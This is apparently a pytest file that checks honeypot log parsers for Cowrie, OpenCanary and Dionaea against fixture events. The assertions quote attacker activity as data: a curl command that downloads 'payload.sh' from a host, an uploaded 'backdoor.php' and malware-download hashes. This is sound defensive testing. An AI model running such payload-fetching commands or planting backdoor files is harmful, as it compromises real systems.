"""
Unit Tests for Parser Correctness on Real Fixtures
Asserts field-level extraction accuracy across Cowrie, OpenCanary, and Dionaea:
- event_type mapping
- IP & Port extraction
- Credentials & Payload preservation
- Timestamp parsing
"""
import os
import json
import pytest
from collectors.parsers.cowrie_parser import CowrieParser
from collectors.parsers.opencanary_parser import OpenCanaryParser
from collectors.parsers.dionaea_parser import DionaeaParser

FIXTURES_DIR = os.path.join(os.path.dirname(__file__), "..", "fixtures")

def test_cowrie_valid_login_fixture():
    path = os.path.join(FIXTURES_DIR, "cowrie", "valid_login.json")
    with open(path, "r", encoding="utf-8") as f:
        raw = json.load(f)

    parser = CowrieParser()
    parsed = parser.parse(raw)

    assert parsed["parser"] == "cowrie"
    assert parsed["event_type"] == "AUTH_SUCCESS"
    assert parsed["source_ip"] == "198.51.100.42"
    assert parsed["source_port"] == 49152
    assert parsed["destination_port"] == 2222
    assert parsed["credentials"]["username"] == "admin"
    assert parsed["credentials"]["password"] == "secretpassword123"
    assert parsed["session_id"] == "sess_cowrie_901"

def test_cowrie_command_fixture():
    path = os.path.join(FIXTURES_DIR, "cowrie", "command.json")
    with open(path, "r", encoding="utf-8") as f:
        raw = json.load(f)

    parser = CowrieParser()
    parsed = parser.parse(raw)

    assert parsed["event_type"] == "COMMAND_EXEC"
    assert "curl -O http://cdn.io/payload.sh" in parsed["command"]
    assert parsed["source_ip"] == "198.51.100.42"

def test_opencanary_http_fixture():
    path = os.path.join(FIXTURES_DIR, "opencanary", "http_alert.json")
    with open(path, "r", encoding="utf-8") as f:
        raw = json.load(f)

    parser = OpenCanaryParser()
    parsed = parser.parse(raw)

    assert parsed["parser"] == "opencanary"
    assert parsed["service"] == "http"
    assert parsed["source_ip"] == "198.51.100.42"
    assert parsed["destination_port"] == 80
    assert parsed["request_details"]["path"] == "/setup.php"

def test_dionaea_smb_fixture():
    path = os.path.join(FIXTURES_DIR, "dionaea", "smb_exploit.json")
    with open(path, "r", encoding="utf-8") as f:
        raw = json.load(f)

    parser = DionaeaParser()
    parsed = parser.parse(raw)

    assert parsed["parser"] == "dionaea"
    assert parsed["event_type"] == "EXPLOITATION_ATTEMPT"
    assert parsed["source_ip"] == "192.168.10.5"
    assert parsed["protocol"] == "smb"
    assert parsed["malware_download"]["md5"] == "5d41402abc4b2a76b9719d911017c592"

def test_cowrie_auth_failure_fixture():
    path = os.path.join(FIXTURES_DIR, "cowrie", "auth_failure.json")
    with open(path, "r", encoding="utf-8") as f:
        raw = json.load(f)
    parsed = CowrieParser().parse(raw)
    assert parsed["event_type"] == "AUTH_FAILED"
    assert parsed["credentials"]["username"] == "root"
    assert parsed["credentials"]["password"] == "123456wrongpassword"

def test_cowrie_file_download_fixture():
    path = os.path.join(FIXTURES_DIR, "cowrie", "download.json")
    with open(path, "r", encoding="utf-8") as f:
        raw = json.load(f)
    parsed = CowrieParser().parse(raw)
    assert parsed["event_type"] == "FILE_DOWNLOAD"
    assert parsed["file_info"]["url"] == "http://cdn.io/payload.sh"
    assert parsed["file_info"]["shasum"] == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

def test_cowrie_file_upload_fixture():
    path = os.path.join(FIXTURES_DIR, "cowrie", "upload.json")
    with open(path, "r", encoding="utf-8") as f:
        raw = json.load(f)
    parsed = CowrieParser().parse(raw)
    assert parsed["event_type"] == "FILE_UPLOAD"
    assert parsed["file_info"]["outfile"] == "backdoor.php"

def test_cowrie_session_connect_and_close_fixtures():
    conn_raw = json.load(open(os.path.join(FIXTURES_DIR, "cowrie", "session_connect.json"), encoding="utf-8"))
    close_raw = json.load(open(os.path.join(FIXTURES_DIR, "cowrie", "session_close.json"), encoding="utf-8"))
    p_conn = CowrieParser().parse(conn_raw)
    p_close = CowrieParser().parse(close_raw)
    assert p_conn["event_type"] == "CONNECTION_OPENED"
    assert p_close["event_type"] == "CONNECTION_CLOSED"
    assert p_conn["session_id"] == p_close["session_id"]

def test_opencanary_auth_and_protocols_fixtures():
    http_auth = json.load(open(os.path.join(FIXTURES_DIR, "opencanary", "http_auth.json"), encoding="utf-8"))
    ftp_login = json.load(open(os.path.join(FIXTURES_DIR, "opencanary", "ftp_login.json"), encoding="utf-8"))
    ftp_up = json.load(open(os.path.join(FIXTURES_DIR, "opencanary", "ftp_upload.json"), encoding="utf-8"))
    pscan = json.load(open(os.path.join(FIXTURES_DIR, "opencanary", "portscan.json"), encoding="utf-8"))
    ssh_att = json.load(open(os.path.join(FIXTURES_DIR, "opencanary", "ssh_attempt.json"), encoding="utf-8"))

    parser = OpenCanaryParser()
    p_http = parser.parse(http_auth)
    p_ftp = parser.parse(ftp_login)
    p_up = parser.parse(ftp_up)
    p_scan = parser.parse(pscan)
    p_ssh = parser.parse(ssh_att)

    assert p_http["service"] == "http"
    assert p_http["credentials"]["username"] == "admin"
    assert p_ftp["service"] == "ftp"
    assert p_ftp["credentials"]["username"] == "anonymous"
    assert "STOR" in p_up["request_details"]["command"]
    assert p_scan["service"] == "portscan"
    assert p_ssh["service"] == "ssh"
    assert p_ssh["credentials"]["password"] == "toorpassword"

def test_dionaea_multi_protocol_payload_fixtures():
    parser = DionaeaParser()
    bind_raw = json.load(open(os.path.join(FIXTURES_DIR, "dionaea", "smb_connect.json"), encoding="utf-8"))
    payload_raw = json.load(open(os.path.join(FIXTURES_DIR, "dionaea", "smb_payload.json"), encoding="utf-8"))
    mssql_raw = json.load(open(os.path.join(FIXTURES_DIR, "dionaea", "mssql_probe.json"), encoding="utf-8"))
    http_raw = json.load(open(os.path.join(FIXTURES_DIR, "dionaea", "http_payload.json"), encoding="utf-8"))

    p_bind = parser.parse(bind_raw)
    p_pay = parser.parse(payload_raw)
    p_sql = parser.parse(mssql_raw)
    p_http = parser.parse(http_raw)

    assert p_bind["event_type"] == "smb_bind"
    assert p_bind["protocol"] == "smb"
    assert p_pay["malware_download"]["sha256"] == "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae"
    assert p_sql["protocol"] == "mssql"
    assert p_http["protocol"] == "http"
    assert p_http["malware_download"]["md5"] == "098f6bcd4621d373cade4e832627b4f6"
